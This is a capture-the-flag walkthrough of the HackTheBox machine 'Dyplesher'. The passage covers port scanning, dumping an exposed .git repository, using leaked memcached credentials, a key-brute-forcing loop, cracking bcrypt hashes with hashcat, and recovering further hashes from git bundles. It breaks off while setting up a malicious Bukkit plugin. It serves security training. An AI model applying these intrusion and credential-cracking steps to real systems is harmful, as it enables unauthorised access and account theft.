---
title: HTB: Dyplesher
url: https://0xdf.gitlab.io/2020/10/24/htb-dyplesher.html
date: 2020-10-24T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: hackthebox, ctf, htb-dyplesher, nmap, memcached, gobuster, gogs, git, gitdumper, memcached-binary, memcached-auth, memcached-cli, memcat, credentials, git-bundle, sqlite, hashcat, bukkit, minecraft, spigot, intellij, java, jar, webshell, packet-capture, wireshark, cuberite, rabbitmq, amqp-publish, lua, htb-canape, htb-waldo, htb-dab
---

![Dyplesher](https://0xdfimages.gitlab.io/img/dyplesher-cover.png)

Dyplesher pushed server modern technologies that are not common in CTFs I’ve done. Initial access requires finding a virtual host with a .git directory that allows me to find the credentials used for the memcache port. After learning about the binary memcache protocol that supports authentication, I’m able to connect and dump usernames and password from the cache, which provide access to a Gogs instance. In Gogs, I’ll find four git bundles (repo backups), one of which contains custom code with an SQLite db containing password hashes. One cracks, providing access to the web dashboard. In this dashboard, I’m able to upload and run Bukkit plugins. I’ll write a malicious one that successfully writes both a webshell and an SSH key, both of which provide access to the box as the same first user. This user has access to a dumpcap binary, which I’ll use to capture traffic finding Rabbit message queue traffic that contains the usernames and password for the next user. This user has instructions to send a url over the messaging queue, which will cause the box to download and run a cuberite plugin. I’ll figure out how to publish my host into the queue, and write a malicious Lua script that will provide root access. In Beyond Root, I’ll look more deeply at the binary memcache protocol.

## Box Info

| Name | [Dyplesher](https://hackthebox.com/machines/dyplesher)  [Dyplesher](https://hackthebox.com/machines/dyplesher) [Play on HackTheBox](https://hackthebox.com/machines/dyplesher) |
| --- | --- |
| Release Date | [23 May 2020](https://twitter.com/hackthebox_eu/status/1263471143769518080) |
| Retire Date | 24 Oct 2020 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Dyplesher |
| Radar Graph | Radar chart for Dyplesher |
| First Blood User | 10:01:31[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 10:39:27[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creators | [felamos felamos](https://app.hackthebox.com/users/27390)  [yuntao yuntao](https://app.hackthebox.com/users/12438) |

## Recon

### nmap

`nmap` identified ten open TCP ports:

```

root@kali# nmap -p- --min-rate 10000 --oA scans/alltcp 10.10.10.190
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 06:36 EDT
Nmap scan report for 10.10.10.190
Host is up (0.029s latency).
Not shown: 65525 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
3000/tcp  open   ppp
4369/tcp  open   epmd
5672/tcp  open   amqp
11211/tcp open   memcache
25562/tcp open   unknown
25565/tcp open   minecraft
25572/tcp closed unknown
25672/tcp open   unknown

Nmap done: 1 IP address (1 host up) scanned in 26.93 seconds

root@kali# nmap -p 22,80,3000,4369,5672,11211,25562,25565,25572,25672 -sC -sV --oA scans/tcpscripts 10.10.10.190
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 06:39 EDT
Nmap scan report for 10.10.10.190                                                 
Host is up (0.013s latency).                                                      
                                                                                  
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:       
|   3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 (RSA)
|   256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e (ECDSA)
|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)          
80/tcp    open   http       Apache httpd 2.4.41 ((Ubuntu))  
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyplesher
3000/tcp  open   ppp?                                                             
| fingerprint-strings:                                                            
|   GenericLines, Help:
|     HTTP/1.1 400 Bad Request          
|     Content-Type: text/plain; charset=utf-8
|     Connection: close                                                           
|     Request
|   GetRequest:    
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=e6fa4e068ae45520; Path=/; HttpOnly
|     Set-Cookie: _csrf=uGYKdSCf-43tCXJwe8rPbshk5R86MTU5MDU3NjEyMTk4MTY2MDExNQ%3D%3D; Path=/; Expires=Thu, 28 May 2020 10:42:01 GMT; HttpOnly
|     Date: Wed, 27 May 2020 10:42:01 GMT 
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="uGYKdSCf-43tCXJwe8rPbshk5R86MTU5MDU3NjEyMTk4MTY2MDExNQ==" />
|     <meta name="_suburl" content="" />
|     <meta proper
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=688248c6940ad29d; Path=/; HttpOnly
|     Set-Cookie: _csrf=EalAQcIsC7PvTp25wi8RdQGxbeQ6MTU5MDU3NjEyNzA4MDUwOTE0Ng%3D%3D; Path=/; Expires=Thu, 28 May 2020 10:42:07 GMT; HttpOnly                                 
|     Date: Wed, 27 May 2020 10:42:07 GMT                                         
|     <!DOCTYPE html>                                                             
|     <html>                                                                      
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="EalAQcIsC7PvTp25wi8RdQGxbeQ6MTU5MDU3NjEyNzA4MDUwOTE0Ng==" />
|     <meta name="_suburl" content="" />                 
|_    <meta
4369/tcp  open   epmd       Erlang Port Mapper Daemon                             
| epmd-info:                                                                      
|   epmd_port: 4369        
|   nodes:                 
|_    rabbit: 25672
5672/tcp  open   amqp       RabbitMQ 3.7.8 (0-9)
| amqp-info:                                
|   capabilities:                           
|     publisher_confirms: YES               
|     exchange_exchange_bindings: YES       
|     basic.nack: YES                       
|     consumer_cancel_notify: YES           
|     connection.blocked: YES               
|     consumer_priorities: YES              
|     authentication_failure_close: YES     
|     per_consumer_qos: YES                 
|     direct_reply_to: YES                  
|   cluster_name: rabbit@dyplesher          
|   copyright: Copyright (C) 2007-2018 Pivotal Software, Inc.                           
|   information: Licensed under the MPL.  See http://www.rabbitmq.com/                  
|   platform: Erlang/OTP 22.0.7             
|   product: RabbitMQ                       
|   version: 3.7.8                          
|   mechanisms: PLAIN AMQPLAIN              
|_  locales: en_US                          
11211/tcp open   memcache?                  
25562/tcp open   unknown                    
25565/tcp open   minecraft?
| fingerprint-strings:                      
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, LDAPSearchReq, LPDString, SIPOptions, SSLSessionReq, TLSSessionReq, afp, ms-sql-s, oracle-tns:
|     '{"text":"Unsupported protocol version"}                                          
|   NotesRPC:                               
|     q{"text":"Unsupported protocol version 0, please use one of these versions:       
|_    1.8.x, 1.9.x, 1.10.x, 1.11.x, 1.12.x"}                                            
25572/tcp closed unknown                    
25672/tcp open   unknown                    
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :   
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============              
SF-Port3000-TCP:V=7.80%I=7%D=5/27%Time=5ECE4386%P=x86_64-pc-linux-gnu%r(Ge              
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t              
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x              
SF:20Request")%r(GetRequest,2063,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\              
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;              
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=e6fa4e068ae45520;\              
SF:x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=uGYKdSCf-43tCXJwe8rPbshk              
SF:5R86MTU5MDU3NjEyMTk4MTY2MDExNQ%3D%3D;\x20Path=/;\x20Expires=Thu,\x2028\              
SF:x20May\x202020\x2010:42:01\x20GMT;\x20HttpOnly\r\nDate:\x20Wed,\x2027\x              
SF:20May\x202020\x2010:42:01\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<he              
...[snip]...                                    
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============              
SF-Port25565-TCP:V=7.80%I=7%D=5/27%Time=5ECE43A9%P=x86_64-pc-linux-gnu%r(D              
SF:NSVersionBindReqTCP,2A,"\)\0'{\"text\":\"Unsupported\x20protocol\x20ver              
...[snip]...                   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                   
Nmap done: 1 IP address (1 host up) scanned in 178.61 seconds 

```

A UDP scan didn’t return anything interesting. Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu eoan (19.10).

To summarize what I see in these scans:
- SSH is open, so keep an eye out for creds / keys.
- Two HTTP servers, something custom on 80 and Gogs on 3000.
- Erlang Port Mapper Daemon on 4369. I looked at this a bit in [Canape](/2018/09/15/htb-canape.html#execution-through-empd) a long time ago. It’s got a reference to RabbitMQ, which I see on 5672 and 4369 suggests is also on 25672.
- Memcache on 11211.
- Unidentified service running on 25562.
- Potentially Minecraft running on 25565.
- 25572 is reporting closed, which can indicate some kind of firewall blocking that port.

### memcache - TCP 11211

If I have access to memcache, I can look for interesting information, or maybe even get execution. Unfortunately, when I try to connect, it just hangs:

```

root@kali# telnet 10.10.10.190 11211
Trying 10.10.10.190...
Connected to 10.10.10.190.
Escape character is '^]'.
version

```

I suspect that while it is listening on 0.0.0.0, it is configured somehow to not allow me to connect to it, either by IP address, or lacking creds.

### Website / dyplesher.htb - TCP 80

#### Site

The site is the front page for a Minecraft server.

![image-20200527082919058](https://0xdfimages.gitlab.io/img/image-20200527082919058.png)

There’s a hostname in there, `test.dyplesher.htb`. I’ll add that and `dyplesher.htb` to `/etc/hosts`. I did try using `wfuzz` to look for additional VHosts, but only found `test`.

The links are all dead, except for the “How to get headshot” link, which leads to a Youtube video, and the “Staff” link, which leads to this page:

![image-20200527083331179](https://0xdfimages.gitlab.io/img/image-20200527083331179.png)

The links under each user go to `http://dyplesher.htb:8080/[username]`, except that MinatoTW’s link goes to `/arrexel`. This is weird, as port 8080 isn’t open as far as I can tell.

The site seems exactly the same when visited by IP and by `dyplesher.htb`.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://dyplesher.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-dyplesher.htb-medium
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://dyplesher.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/27 08:42:39 Starting gobuster
===============================================================
/img (Status: 301)
/login (Status: 200)
/register (Status: 302)
/home (Status: 302)
/staff (Status: 200)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/27 10:35:47 Finished
===============================================================

```

`/register` and `/login` are interesting.

#### /login

`/register` just returns a 302 redirect to `/login`. This page presents a login form:

![image-20200527084500204](https://0xdfimages.gitlab.io/img/image-20200527084500204.png)

I tried some basic SQL injections, but nothing worked. I’ll come back when I find creds.

### Gogs - TCP 3000

TCP 3000 is an instance of Gogs, a open source self-hosted Git service:

![image-20200527084842019](https://0xdfimages.gitlab.io/img/image-20200527084842019.png)

I can explore and see three users, but no repositories:

![image-20200527084939670](https://0xdfimages.gitlab.io/img/image-20200527084939670.png)

I can even register an account, but it doesn’t get me access to anything useful.

### test.dyplesher.htb - TCP 80

#### Site

The site is a simple form:

![image-20200528092046813](https://0xdfimages.gitlab.io/img/image-20200528092046813.png)

If I send in a key that matches the value, it returns this same form. If the key doesn’t match the value, it returns the form again in an HTTP 500 message (which is weird, but seems to work).

```

HTTP/1.0 500 Internal Server Error
Date: Sun, 18 Oct 2020 15:26:18 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 206
Connection: close
Content-Type: text/html; charset=UTF-8

<HTML>
<BODY>
<h1>Add key and value to memcache<h1>
<FORM METHOD="GET" NAME="test" ACTION="">
<INPUT TYPE="text" NAME="add">
<INPUT TYPE="text" NAME="val">
<INPUT TYPE="submit" VALUE="Send">
</FORM>

<pre>

```

The same page loads if I go to `index.php`, confirming that this is a PHP-based site.

#### Directory Brute Force

I’ll brute force directory paths, including `-x php`, but nothing really interesting comes up:

```

root@kali# gobuster dir -u http://test.dyplesher.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o scans/gobuster-test.dyplesher.htb-medium-php -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://test.dyplesher.htb
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/05/28 08:58:59 Starting gobuster
===============================================================
/index.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/05/28 09:01:04 Finished
===============================================================

```

#### nmap

When I run `gobuster`, I use a wordlist that doesn’t include `.git`. This is fine because I typically rely on the `nmap` scripts to point that out to me. Therefore, I should check again running the scripts against the new subdomain, which shows the `.git` path:

```

root@kali# nmap -sC -sV -p 80 -oA scans/nmap-test.dyplesher.htb-scripts test.dyplesher.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 09:31 EDT
Nmap scan report for test.dyplesher.htb (10.10.10.190)
Host is up (0.25s latency).
rDNS record for 10.10.10.190: dyplesher.htb

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.10.190:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: first commit 
|     Remotes:
|_      http://localhost:3000/felamos/memcached.git
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds

```

#### Get .git

I’ll use [GitTools](https://github.com/internetwache/GitTools) `gitdumper.sh` to get the repo:

```

root@kali# /opt/GitTools/Dumper/gitdumper.sh http://test.dyplesher.htb/.git/ ./git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########

[*] Destination folder does not exist
[+] Creating ./git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/b1/fe9eddcdf073dc45bb406d47cde1704f222388
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/3f/91e452f3cbfa322a3fbd516c5643a6ebffc433
[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
[+] Downloaded: objects/27/29b565f353181a03b2e2edb030a0e2b33d9af0

```

Now I can go into the directory, and while there’s no files, I have the Git repo:

```

root@kali# cd git/
root@kali# ls git/ -al
total 12              
drwxrwx--- 1 root vboxsf 4096 May 28 09:33 .
drwxrwx--- 1 root vboxsf 4096 May 28 09:33 ..
drwxrwx--- 1 root vboxsf 4096 May 28 09:33 .git

```

Git shows that a couple files are missing since the last commit:

```

root@kali# git status 
On branch master
Your branch is based on 'origin/master', but the upstream is gone.
  (use "git branch --unset-upstream" to fixup)

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    README.md
        deleted:    index.php

no changes added to commit (use "git add" and/or "git commit -a")

```

I can bring them back with a reset:

```

root@kali# git reset --hard
HEAD is now at b1fe9ed first commit

root@kali# ls
index.php  README.md

```

`README.md` is empty. But `index.php` has some info:

```

<HTML>
<BODY>
<h1>Add key and value to memcache<h1>
<FORM METHOD="GET" NAME="test" ACTION="">
<INPUT TYPE="text" NAME="add">
<INPUT TYPE="text" NAME="val">
<INPUT TYPE="submit" VALUE="Send">
</FORM>

<pre>
<?php
if($_GET['add'] != $_GET['val']){
        $m = new Memcached();
        $m->setOption(Memcached::OPT_BINARY_PROTOCOL, true);
        $m->setSaslAuthData("felamos", "zxcvbnm");
        $m->addServer('127.0.0.1', 11211);
        $m->add($_GET['add'], $_GET['val']);
        echo "Done!";
}
else {
        echo "its equal";
}
?>
</pre>

</BODY>
</HTML>

```

It seems that memcached is using a plugin to require authentication (which is non typical for memcached), which explains why I couldn’t connect earlier.

## Shell as MinatoTW

### memcache with Auth

#### Client

Now with creds, I can connect to memcache again. I learned a ton about memcache on the wire in this process. It turns out that memcache can either be ASCII (like in the past when I’ve just used `telnet` or `nc`) *or* a [binary protocol](https://github.com/memcached/memcached/wiki/BinaryProtocolRevamped). In the PHP code above, it sets the option to use the binary version:

```

$m->setOption(Memcached::OPT_BINARY_PROTOCOL, true);

```

Beyond that, authenticated connections only work over the binary protocol (from [Wikipedia](https://en.wikipedia.org/wiki/Memcached#Security)):

> Most deployments of Memcached are within trusted networks where clients may freely connect to any server. However, sometimes Memcached is deployed in untrusted networks or where administrators want to exercise control over the clients that are connecting. For this purpose Memcached can be compiled with optional [SASL](https://en.wikipedia.org/wiki/Simple_Authentication_and_Security_Layer) authentication support. The SASL support requires the binary protocol.

I’ll dig into the binary protocol deeper in [Beyond Root](#beyond-root---memcache-binary-protocol).

It turns out that there’s a decent memcached client in Node. After installing Node, I installed it with `npm install -g memcached-cli`.

Now I can connect, if I provide the username and password:

```

root@kali# memcached-cli felamos:zxcvbnm@10.10.10.190:11211
10.10.10.190:11211>

```

Unfortunately, this client has only limited commands:

```
10.10.10.190:11211> help

  Commands:

    help [command...]                   Provides help for a given command.
    exit                                Exits application.
    get <key>                           Get the value of a key
    set <key> <value> [expires]         Set the value of a key
    add <key> <value> [expires]         Set the value of a key, fail if key exists
    replace <key> <value> [expires]     Overwrite existing key, fail if key not exists
    delete <key>                        Delete a key
    increment <key> <amount> [expires]  increment
    decrement <key> <amount> [expires]  decrement
    flush                               Flush all data
    stats                               Show statistics

```

This client doesn’t allow me to do thing like dump all the keys like I would over the text protocol.

#### Enumerate memcache

I started with some basic guessing, and actually stumbled on one of the keys:

```
10.10.10.190:11211> get password
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

```

I wanted to see what else might be in there, so I switched clients to `memccat` (install with `apt install libmemcached-tools`). I can use this to run a single query from the command line:

```

root@kali# memccat --username felamos --password zxcvbnm --servers 10.10.10.190 password
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

```

Now I’ll just do it in a loop with the `burp-parameter-names.txt` wordlist, a good list of potential keys in a db. Here’s the loop with whitespace for readability:

```

cat /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt 
| while read param; do 
  if res=$(memccat --username felamos --password zxcvbnm --serv
ers 10.10.10.190 $param 2>/dev/null); then 
    echo -e "$param\n$res\n"; 
  fi; 
done

```

It reads each line from the wordlist into `$param`, and runs `memcat with that variable`. If there are errors, I want to ignore then, hence the `2>/dev/null`. If that command returns true (something is saved into `$res`), then I want to print both `$param` and `$res`.

Running it returns three results:

```

root@kali# cat /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt | while read param; do if res=$(memccat --username felamos --password zxcvbnm --servers 10.10.10.190 $param 2>/dev/null); then echo -e "$param\n$res\n"; fi; done
password
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

email
MinatoTW@dyplesher.htb
felamos@dyplesher.htb
yuntao@dyplesher.htb

username
MinatoTW
felamos
yuntao

```

### Crack Hashes

I’ll drop these into a file and run them in `hashcat`. One breaks:

```

root@kali# hashcat -m 3200 bcrypt_hashes /usr/share/wordlists/rockyou.txt --force
...[snip]...
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK:mommy1
...[snip]...

```

### Gogs

#### Login

The password didn’t work on SSH or the main page, but they do work with the username felamos on Gogs. On logging in, I have access to more stuff:

![image-20200528151058701](https://0xdfimages.gitlab.io/img/image-20200528151058701.png)

#### Enumeration

There’s not a ton here. The memcached repo is the same one I pulled from the website. The gitlab repo just has a `README.md`:

![image-20200528161041104](https://0xdfimages.gitlab.io/img/image-20200528161041104.png)

While there are no other files, there is a release:

![image-20200528161115419](https://0xdfimages.gitlab.io/img/image-20200528161115419.png)

I’ll download `repo.zip`.

### repo.zip

#### Creating Repos

After unzipping, this file has four `.bundle` files in it:

```

root@kali# find repositories/ -type f
./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
./@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle
./@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
./@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle

```

Running `file` on each of them reports they are “Git bundle” files:

```

root@kali# find repositories -type f -exec file {} \;
./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle: Git bundle
./@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle: Git bundle
./@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle: Git bundle
./@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle: Git bundle

```

Each of these represents a repo that’s been packed into a file for movement between computers using [git-bundle](https://git-scm.com/docs/git-bundle).

I can unpack it back into a repo using `git clone -b master [file]`. For example:

```

root@kali# git clone -b master @hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
Cloning into '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a'...
Receiving objects: 100% (39/39), 10.46 KiB | 1.49 MiB/s, done.
Resolving deltas: 100% (12/12), done.  

```

I’ll unpack each, and go exploring.

#### Repo Overview

Just poking at `README.md` files in each repo, I can get a general feel for what’s there:

| Repo Startswith | Description | Notes |
| --- | --- | --- |
| 4b22 | `VoteListener.py`, a plugin for Tibia | Files are identical to [public repo](https://github.com/Arrexel/tibia-votelistener) |
| 4e07 | a Minecraft IOT Server | Custom code, lots of yml, some Python, some Java Jars |
| 6b86 | phpbash | Files are identical to [public repo](https://github.com/Arrexel/phpbash) |
| d473 | NightMiner | Files are identical to [public repo](https://github.com/ricmoo/nightminer) |

At this point I’ll focus only on 4e07 because it’s unique to this box. In the root of the repo there’s a bunch of files:

```

root@kali# ls
banned-ips.json      bukkit.yml    craftbukkit-1.8.jar  help.yml  permissions.yml  python     sc-mqtt.jar        spigot-1.8.jar  usercache.json  world
banned-players.json  commands.yml  eula.txt             ops.json  plugins          README.md  server.properties  start.command   whitelist.json  world_the_end

```

`bukkit.yml` is interesting for sure.

In poking around a bit in the Minecraft code, there’s a plugin called `LoginSecurity`. In that directory, there are three files:

```

root@kali# ls
authList  config.yml  users.db

```

The database is SQLite:

```

root@kali# file users.db 
users.db: SQLite 3.x database, last written using SQLite version 3027002
root@kali# sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite>

```

There’s only one table, and contains one more hash:

```

sqlite> .tables
users
sqlite> .headers on
sqlite> select * from users;
unique_user_id|password|encryption|ip
18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81

```

### Crack Hash

Another run just like above, and this one also cracks pretty quickly:

```

root@kali# hashcat -m 3200 more_hash /usr/share/wordlists/rockyou.txt --force
...[snip]...
$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6:alexis1
...[snip]...

```

### Dyplesher Dashboard

#### /login

The cracked password doesn’t work for the other users on Gogs, or as SSH for any of the three usernames I have. But it does let me login as felamos on `http://dyplesher.htb`.

[![image-20200528171748671](https://0xdfimages.gitlab.io/img/image-20200528171748671.png)](https://0xdfimages.gitlab.io/img/image-20200528171748671.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200528171748671.png)

#### Enumeration

Looking around, there are a few pages here. Dashboard and Players are the same as above. Console is a list of console output:

[![image-20200530141535418](https://0xdfimages.gitlab.io/img/image-20200530141535418.png)](https://0xdfimages.gitlab.io/img/image-20200530141535418.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200530141535418.png)

The last three have to do with Plugins. This is clearly where I should focus.

`/home/reload` has a form to load and unload plugins:

![image-20200530154256641](https://0xdfimages.gitlab.io/img/image-20200530154256641.png)

It also tips that `/home/reset` is there to reset. Visiting that just shows “done!”.

`/home/add` has a form to add a file:

![image-20200530154341928](https://0xdfimages.gitlab.io/img/image-20200530154341928.png)

`/home/delete` lists the current plugins:

![image-20200530154416564](https://0xdfimages.gitlab.io/img/image-20200530154416564.png)

The trash can icons don’t actually do anything. Only `reset` seems to reset back to the three shown above.

I’ll also remember from the source code a lot of references to bukkit:

```

root@kali# ls 
banned-ips.json      commands.yml         help.yml         plugins    sc-mqtt.jar        start.command   world
banned-players.json  craftbukkit-1.8.jar  ops.json         python     server.properties  usercache.json  world_the_end
bukkit.yml           eula.txt             permissions.yml  README.md  spigot-1.8.jar     whitelist.json

```

[Bukkit](https://dev.bukkit.org/) is a free, open-source framework to extend a Minecraft server through various plugins. One other detail I’ll note from the source here. If I open up either `crackbukkit-1.8.jar` or `spigot-1.8.jar`, in `META-MF/MANIFEST.MF`, I see the Java version:

```

Build-Jdk: 1.8.0_20

```

### Generate Bukkit Plugin

Java is not a friend of mine, and this was a painful experience. It took a ton of troubleshooting to get this working, and again, that’s hard to show here. I’ll try to walk through my process.

#### Set-Up

I created a new Ubuntu 20.04 VM so I could have a clean development environment, and not muck up my Kali VM. Here’s some references I used as well:
- [How to Install Java on Ubuntu and Linux Mint](https://itsfoss.com/install-java-ubuntu/)
- [How to Install IntelliJ IDEA on Ubuntu and Other Linux Distributions](https://itsfoss.com/install-intellij-ubuntu-linux/)
- [Creating a blank Spigot plugin](https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/)

I installed Java and IntelliJ using the references above, making sure to get the `openjdk-8-jdk` to match the versions from the Jars above. I used the Software Center option for IntelliJ Community Edition.

#### Create Plugin

I followed the steps in the third reference above to create a plugin. I’ll select new project, which open a window. I’ll select Maven and 1.8 java version:

[![image-20200530143121388](https://0xdfimages.gitlab.io/img/image-20200530143121388.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200530143121388.png)

One the next page, I’ll give it a name, and enter the GroupId, which is a domain I control, reversed. To blend in with the target, I’ll use `htb.dyplesher`:

[![image-20200530143430944](https://0xdfimages.gitlab.io/img/image-20200530143430944.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200530143430944.png)

